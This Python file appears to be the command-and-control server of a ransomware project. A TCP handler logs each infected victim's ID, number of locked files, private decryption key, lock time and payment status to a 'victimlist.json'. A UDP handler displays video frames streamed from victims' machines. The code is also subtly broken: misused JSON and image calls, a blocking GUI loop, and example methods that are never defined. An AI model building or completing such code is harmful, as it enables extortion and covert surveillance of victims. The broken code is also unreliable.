import socket
import threading
import json
import threading
import os
import cv2
import tkinter as tk
import numpy as np
from PIL import Image,ImageTk
class MySocket:
    class Server:
        def __init__(self):
            self.__hostIP = "0.0.0.0"
            self.__tcpPort = 8080
            self.__udpPort = 8081
            self.__tcpSocket = None
            self.__udpSocket = None
            self.clients = []

        def startTCPServer(self):
            def handleClient(clientSocket,address):
                def readJson(path):
                    with open(path,"r", encoding='utf-8') as file:
                        data = json.load(file)
                    return data
                def writeJson(path,data):
                    with open(path,"w", encoding='utf-8') as file:
                        json.dump(data,file,indent=4)

                testPath,__rmfolderPath = "./data/victimlist.json",f"C:/Users/{os.getlogin()}/AppData/Local/bkms/victimlist.json"
                req = clientSocket.recv(4096)
                req = json.load(req.decode("utf-8"))

                self.clients[req["UID"]] = address

                victimList = readJson(testPath)
                victimData = {
                    "UID": req["UID"],
                    "fileNumber": req["fileNumber"],
                    "privateKey": req["privateKey"],
                    "date": req["lockTime"],
                    "paid": False
                }
                victimList.append(victimData)
                writeJson(testPath,victimList)

            self.__tcpSocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            self.__tcpSocket.bind((self.__hostIP,self.__tcpPort))
            self.__tcpSocket.listen(20)
            print("start TCP server")

            while True:
                clientSocket,address = self.__tcpSocket.accept()
                threading.Thread(target=handleClient,args=(clientSocket,address)).start()

        def startUDPServer(self):
            def handleClient():
                self.__udpSocket = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
                self.__udpSocket.bind((self.__hostIP,self.__udpPort))
                print("start UPD server")

                root = tk.Tk()
                width, height= 480,360 
                root.geometry(f"{width}x{height}")
                root.resizable(False, False)
                v = tk.Label(root,image=None)
                v.pack(fill="both",expand=True)

                root.mainloop()
                while True:
                    data,address = self.__udpSocket.recvfrom(4096)
                    root.title(str(address))
                    frame = np.frombuffer(data,dtype=np.uint8)
                    frame = cv2.imdecode(frame,cv2.IMREAD_COLOR)
                    frame = frame.resize((480,360))
                    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB) 
                    img = Image.fromarray(frame)
                    img = ImageTk.PhotoImage(image=img)
                    v.config(image=img)
                    v.image = frame
                    root.update()
                
            threading.Thread(target=handleClient).start()

    class Client:
        def __init__(self,):
            self.__serverIP = "127.0.0.1"
            self.__tcpPort = 8080
            self.__udpPort = 8081

# Example usage:
if __name__ == "__main__":
    server = MySocket.Server()
    server_thread = threading.Thread(target=server.start)
    server_thread.start()

    client = MySocket.Client()
    client.send_tcp_message("Hello, TCP Server!")
    client.send_udp_message("Hello, UDP Server!")
